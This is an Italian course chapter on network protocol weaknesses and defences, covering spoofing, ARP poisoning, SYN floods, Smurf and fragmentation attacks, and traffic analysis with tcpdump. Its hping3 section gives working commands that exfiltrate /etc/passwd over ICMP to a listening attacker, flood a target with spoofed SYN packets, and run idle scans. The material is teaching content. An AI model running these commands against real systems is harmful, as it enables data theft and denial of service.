# Debolezze dei Protocolli

## Modello DoD

![DoD](../gitbook/images/dod.png)

I protocolli di rete sono basati sul **Modello DoD** (_Department of Defense_ - 1969), con cui si eseguivano le comunicazioni sull'originaria _ARPAnet_.

L'implementazione per Internet è a partire dal 1980 (Univ. California) ed è stata sviluppata su sistemi _Unix_.

Ha numerose vulnerabilità di sicurezza, che al tempo non era un problema percepito. Purtroppo questa situazione non si può cambiare, dato il numero enorme di nodi Internet che usano questi protocolli.

E' un modello a tre livelli del software di comunicazione, per favorire l'interoperabilità tra _Vendors_ differenti. Ogni fornitore di sofware lo fà ad un livello specifico, e può comunicare con gli altri livelli software perchè le interfacce sono ben definite.

## Datagramma IP

Tutti i dati transitano in Internet in **pacchetti** dati, della dimensione massima di 64 Kilobyte ciascuno, ma solitamente inferiori ai 1500 byte. Le reti fisiche a basso livello non consentono il passaggio a pacchetti più grandi.

Un pacchetto a livello _internetworking_ del _Modello DoD_ è gestito dal protocollo **IP** (_Internet Protocol_) e si chiama un **datagramma**.

Tutte le informazioni necessarie al protocollo IP si trovano nella testata del datagramma,con una struttura fissa.

![IPHead](../gitbook/images/iphead.png)

Nei quasi 60 anni della sua storia il protocollo IP si è evoluto, per cui alcuni campi sono diventati obsoleti, ma la struttura originale del datagramma non può cambiare.

Vi sono tre grosse vulnerabilità:

* Non c’è alcuna autenticazione dei campi, in particolare dell’indirizzo IP del mittente
  * O il computer ricevente si fida della verità di ciascun campo, o non ha modo di verificare
* Altri campi possono trasportare informazioni nascoste (fuori banda)
  * Un campo non più usato nello smistamento può comunque contenere delle informazioni nascoste per comunicazioni _stealth_
* Tuttele opzioni possibili o sono inutili o potenzialmente pericolose

### Spoofing

La contraffazione (_spoofing_) dell'indirizzo del mittente è un requisito di base di molti attacchi.

IP del mittente è volutamente falso:

* o per nascondere l’identità del mittente vero
* oppure per impersonare un altro mittente, fidato

Alcuni servizi usano solo l’indirizzo IP per autenticare. Nel caso della richiesta di esecuzione di un comando, non c'è alcuna protezione.

![SpoExe](../gitbook/images/spoexe.png)

L’ottenimento di informazioni riservate è più complesso ed implica una mofifica del routing.

Vi sono molti modi di modificare il routing, per esempio con falsi messaggi di _Route Update_.

![SpoQuery](../gitbook/images/spoquery.png)

### Impersonazioni

![Impers](../gitbook/images/impers.png)

### Intercettamento

![Intercet](../gitbook/images.intercet.png)

### Man in the Middle

![MitM](../gitbook/images/mitm.png)

Può funzionare a parecchi livelli di protocollo:

* Trasporto
* Applicazione

L'hacker può generare token di autenticazione falsi in entrambe le direzioni.

### Man on the Side

![ManSide](../gitbook/images/manside.png)

TCP/IP ignora i pacchetti duplicati.

Lo hacker è fisicamente più vicino di Server così i suoi pacchetti arrivano sempre per primi.


### Avvelenamento di Cache ARP

Per risolvere l’indirizzo **MAC** a livello Interfacce Fisiche dall’indirizzo IP dei Protocolli di Rete si usa il protocollo **ARP** (_Address Resolution Protocol_).

![ARP](../gitbook/images/arp.png)

Svolgimento normale:

* Il richiedente invia una richiesta broadcast `who-has` alla LAN con parametro l’indirizzo IP.
* Il nodo che riconosce il proprio indirizzo IP risponde con un pacchetto unicast `is-at` col proprio indirizzo MAC.
* Il richiedente lo segna in una cache per due minuti.

Attacchi - è un altro nodo che risponde:

* Col proprio indirizzo MAC
* Con l’indirizzo MAC di un terzo o inesistente

Per due minuti la cache ARP è _avvelenata_ - la comunicazione è impossibile. Poi l'effetto si ripete.

Contromisura.

Anzichè usare il protocollo ARP che è dinamico, configurare gli indirizzi MAC in un file statico: `/etc/ethers`.
Purtroppo è molto oneroso mantenere questo file aggiornato su tutte le macchine della LAN.

E’ un attacco di Diniego di Servizio. E’ raro che più di un nodo compia l’attacco.

Il nodo colpevole è probabilmente stato infettato tramite Ingegneria Sociale.

## TCP

A livello _End-to-End Communication_ vi sono due protocolli:

* **TCP** - _Transmission Control Protocol_ - affidabile ma lento, per file transfer, posta, web, ecc.
* **UDP** - _User Datagram Protocolo_ - veloce ma inaffidabile, per streaming, DNS, ecc.

Ciascuno ha la sua testata, con campi specifici.

![TCPHead](../gitbook/images/tcphead.png)

Il protocollo TCP è _stateful_, ed esegue connessioni. Una serie di _flags_ binari denotano in quale stato si trovi la comunicazione. Non tutte le combinazioni di flags sono possibili però.

Inviare un pacchetto con i flag sbagliati perlo stato corrente permette molte tipologie di trucchi ed attacchi.

### Connessione Normale

Lo stabilimento di una connessione TCP è uno **Handshake a Tre Vie**.

![TCPHand](../gitbook/images/tcphand.png)

### Connessione Anomala

![StealthScan](../gitbook/images/stealthscan.png)

Se i flag dei pacchetti sono fuori sequenza, il server invvia un pacchetto col flag **RST** (_reset_) e non compie la connessione (o il logging). Ha però tradito la sua presnza: è stat una **scansione stealth**.

## ICMP

Lo **Internet Control Message Protocol** è un protocollo ausiliario ma obbligatorio e invia _messaggi_ in datagrammi IP.

Compiti:

* Feedback per problemi di recapito
* Incrementare l'efficienza globale di rete

E' utilizzato in molti attacchi hacker, tanto che molti messaggi ICMP sono di solito disabilitati. Infatti alcuni messaggi ICMP sono ormai obsoleti, e vi sono altri metodi per ottenere gli stessi servizi.

Qualche utilities però usa ancora ICMP, per esempio `ping`.

![ICMP](../gitbook/images/icmp.png)

## Packet Crafting

![hping](../gitbook/images/hping.png)

`hping3` - Autore: Salvatore Sanfilippo

Costruzione di pacchetti con riempimento dei campi.

Invia un pacchetto con flag SYN alla porta 80:

```bash
hping3 -I eth0 -S 192.168.10.1 -p 80
```

Opzioni per flag:

```bash
-F FIN		-R RST	 	-S SYN
-P PUSH		-A ACK		-U URG 
-X Xmas(1st unused)		-Y Ymas(2nd unused)
```

Dalla porta 79 in poi:

```bash
hping3 -I eth0 -S 192.168.10.1 -p ++79
```

Ritorna `flags=SA` per porta aperta e `flags=RA` per porta chiusa.

Altre opzioni:

* `-s --baseport` porta sorgente base (default random) – incrementata di 1 ad ogni invio
* `-p --destport[+][+]<port>` porta destinazione (default 0)
* `-k --keep` mantiene porta sorgente
* `-w --win` dimensione finestra (default 64)
* `-O --tcpoff` offset dati (invece di tcphdrlen / 4)
* `-Q --seqnum` mostra solo il numero di sequenza
* `-b --badcksum` invia checksum sbagliato (non sempre funziona)
* `-M --setseq` setta il numero di sequenza TCP
* `-L --setack` setta il numero di acknowledge TCP

### File Transfer su ICMP

Il controller remoto che ha infettato una macchina locale deve poter comunicare con essa, per esempio per trasferire files di materiale confidenziale.

Spesso il ping ha il permesso di transito dal firewall.

Questo corrisponde ai tipi:

* 8 - **Echo Request** (“ping”)
* 0 - **Echo Reply** (“pong”)

![FileICMP](../gitbook/images/fileicmp.png)

Purtroppo il payload del ping arriva a 64 Kbyte.
Usandone 500 per pacchetto per non causare sospetti si può comunque trasferire un file.
Per accorgersene occorre avere nella rete uno **Intrusion Detection System** ben calibrato.

Lato server (hacker):

```bash
hping3 192.168.10.66 --listen signature --safe --icmp
```

Output su standard output

Lato client (complice oltre il firewall):

```bash
hping3 192.168.10.44 --icmp –icmptype 8 -d 100 --sign signature --file /etc/passwd
```

* `-d` dimensione del corpo del pacchetto
* `--listen signature` accetta solo i pacchetti firmati 'signature'
* `--sign signature` invia oacchetti firmati 'signature' (La firma è una stringa all'inizio del corpo del pacchetto)
* `--safe` ritrasmissione dei pacchetti persi

### Syn Flood

![SynFlood](../gitbook/images/synflood.png)

Lo hacker dal client manda al server una sfilza continua, uno ogni 10 millisecondi, di pacchetti col flag `SYN` settato.

Il server per ciascuno di essi apre una connessione `pending` (in corso) nella tabella delle connessioni, quindi invia al client il responso `SYN ACK` e attende lo `ACK` finale per un timeout tipico di 20 secondi.

In 20 secondi riceve però 2000 richieste di connessione, mai nessuna terminata, e la tabella delle connessioni può andare in overflow.

Il traffico _vero e onesto_ viene rallentato, forse impedito dall'attacoo DOS, finchè non è terminato.

```bash
hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u10
```

* `-a` indirizzo di spoof
* `-i u10` ogni 10 millisecondi

### Idle Scan

![IdleScan](../gitbook/images/idlescan.png)

Richiede una macchina Zombie con sequenza prevedibile di generazione di ID di pacchetto

* Windows
* Stampanti

Testare uno Zombie:

```bash
hping3 -I eth0 -SA 192.168.10.1
```

Se lo id incrementa di 1 va bene.

Scansione. Finestra 1 con intervallo di 5 secondi:

```bash
hping3 -I eth0 -i 5 -a 192.168.10.1 -S 192.168.10.33 -p ++20
```

Finestra 2:

```bash
hping3 -I eth0 -r -S 192.168.10.1 -p 2000
```

* `-r`  display degli incrementi, non degli id interi; se +1: porta server chiusa, se +2: porta server aperta

### Attacco Smurf

![Smurf](../gitbook/images/smurf.png)

In inglese _smurf_ è un _puffo_.

Il `ping` viene anche usato per un attacco di _Diniego di Servizio Distribuito_ (DDOS). Viene inviato un ping ad un indirizzo **broadcast** che identifica una rete intera con anche migliaia di computer, la **Rete Amplificante**.

L'indirizzo del mittente del `ping` è _spoofed_: è quello della vittima.

Un computer non dovrebbe mai rispondere ad un ping broadcast, ma computer vecchi lo fanno, oppure altri dispositivi che non sono PC (_Internet of Things_).

La vittima si vede subissata da migliaia di `pong` al secondo, e soccombe.

### Attacco Stacheldraht

![Stach](../gitbook/images/stach.png)

_Filo spinato_, in tedesco.

Se le reti amplificatrici sono molte, e sono gestite da una BotNet di _Ripetitori_, la vittima può anche ricevere milioni di pacchetti al secondo.

A questo punto però sono le reti dei Service Provider che cedono per prime.

## Attacchi a Frammentazione

![Frag](../gitbook/images/frag.png)

Una rete fisica ha un massimo di byte che può trasferire in un'unica _trama fisica_: lo **MTU**, _Maximum Transfer Unit_, tipicamente di 1500 bytes.

Se un datagramma IP è di dimensioni maggiori, questo viene spezzato in sottopacchetti più piccoli, i **frammenti**.

Ogni frammento viaggia indipendentemente dagli altri e solo la destinazione finale è in grado di ricomporre il pacchetto.

L'invio di frammenti speciali, costruiti ad arte, può causare tutta una serie di problemi al ricevente, al limite fermarlo, e condurre così un _Diniego di Servizio_.

Gli attacchi sono una miriade, basati, p.es., sui problemi:

* i frammenti dello stesso pacchetto sono troppi
* i frammenti sono parzialmente sovrapposti
* un frammento sovrascrive un altro frammento
* vi sono 'buchi' fra i frammenti

La frammentazione è al giorno d'oggi deprecata da tutti i sistemi operativi moderni.

### Ping della Morte

![PingDeath](../gitbook/images/pingdeath.png)

Nessun pacchetto `ping` può essere più grande di 64 KB alla partenza, ma se l'attaccante invia un numero molto elevato di frammenti, la cui somma è superiore a 64 KB, il ricevente andrà in **overflow**.

## Contrasto alle Debolezze

### Sistema Operativo Moderno

Vengono scoperte decine di vulnerabilità ogni anno di ogni versione di sistema operativo moderno. Se il sistema operativo èancora supportato dal produttore, vengono distribuite le **patch** di sicurezza, altrimenti la vulnerabilità rimane.

Occorre usare un sistema operativo supportato al presente e nel futuro prevedibile.

Occorre mantenere aggiornato il sistema operativo e applicare al più presto le patch di sicurezza.

Chi usa versioni non supportate non solo corre dei rischi personali, ma **danneggia la rete locale**, permettendo l'ingresso di _malware_. E' da considerarsi un **comportamento irresponsabile**, alla stregua di mandare un bambino non vaccinato a scuola.

#### Supporto a Windows

![WindowSupp](../gitbook/images/windowsupp.png)

L'unica versione possibile al momento è **Windows 10**.

Per chi ha una licenza con supporto esteso, **Windows 7** è al limite.

Molti purtroppo lo usano ancora, ma **Windows XP** è da scartare al più presto.

### Sistemi Unix

Unix ha una lunga storia di sviluppo. _Tutti_ i sistemi operativi moderni sono discendenti di Unix, chi più e chi meno, incluso Windows.

Lafigura mostra le principali varianti di Unix (non Windows) circa un anno fa'.

![Unices](../gitbook/images/unices.png)

#### Mac

![MacOS](../gitbook/images/macos.png)

La Apple non ha una schedulazione precisa di supporto futuro delle proprie versioni **MacOS**:

Si può in generale attendersi un supporto della durata di 4-5 anni dall'uscita di una versione.

Qualsiasi versione anteriore a **Mountain Lion** è da considerarsi obsoleta.

#### Linux Ubuntu

![Ubu](../gitbook/images/ubu.png)

La ditta **Canonical** fornisce nuove versioni di Ubuntu di due tipologie:

* versioni standard, ogni 6 mesi, supportate per 8 mesi
* versioni **Long Term Support** (_LTS_), ogni 2 anni, supportate attivamente per 2 anni, e con patch di manutenzione per altri 2 anni

La versione corrente da adottare al più presto è la **18.04 LTS**. La precedente versione stabile, **16.04 LTS** è entrata in fase di mera manutenzione, non sviluppo.

Clienti che lo richiedano, e paghino una adeguata licenza - praticamente grosse realtà industriali o enti pubblici americani - possono avere la variante _server_ di Ubuntu mantenuta per ulteriori 2 anni.

### Analisi del Traffico

#### tcpdump

![Tcpdump](../gitbook/images/tcpdump.png)

Analizzatore di traffico da linea di comando.

Più veloce dei prodotti grafici.

Basato sulla libreria `pcap` (_Promiscuous Capabilities_) - necessita permessi di root.

* Potente linguaggio di filtro simile al linguaggio C
* Standard de facto per i linguaggi filtro
* Si può salvare ad un file e analizzare in seguito
* Disponibile per Unix e Windows

Sintassi:

```bash
tcpdump -i interfaccia [ opzioni ] [ filtro ]
```

Alcune opzioni:

* `-w | -r file` - scrive in | legge da file
* `-v -vv -vvv` - verbosità a vari livelli
* `-x  -xx  -X` - anche il contenuto in hex

Esempi:

* Cattura pacchetti da interfaccia specifica:
  * `tcpdump -i eth0`
* Cattura numero limitato di pacchetti:
  * `tcpdump -c 5 -i eth0`
* Stampa i pacchetti in ASCII:
  * `tcpdump -A -i eth0`
* Stampa i pacchetti in Hex e ASCII:
  * `tcpdump -XX -i eth0`
* Mostra le interfacce disponibili:
  * `tcpdump -D`
* Salva i pacchetti in un file
  * `tcpdump -w 0001.pcap -i eth0`
* Leggi i pacchetti da un file:
  * `tcpdump -r 0001.pcap`
* Non risolvere nomi con DNS:
  * `tcpdump -n -i eth0`
* Cattura solo il protocollo TCP:
  * `tcpdump -i eth0 tcp`
* Cattura da una porta specifica:
  * `tcpdump -i eth0 port 22`
* Cattura da sorgente specifica:
  * `tcpdump -i eth0 src 192.168.20.151`
* Cattura a destinazione specifica:
  * `tcpdump -i eth0 dst 10.10.10.10`

#### Wireshark

![Wireshark](../gitbook/images/wireshark.png)

Interfaccia grafica a tcpdump.

Richiede i permessi di root per aprire le interfacce in modalità promiscua.
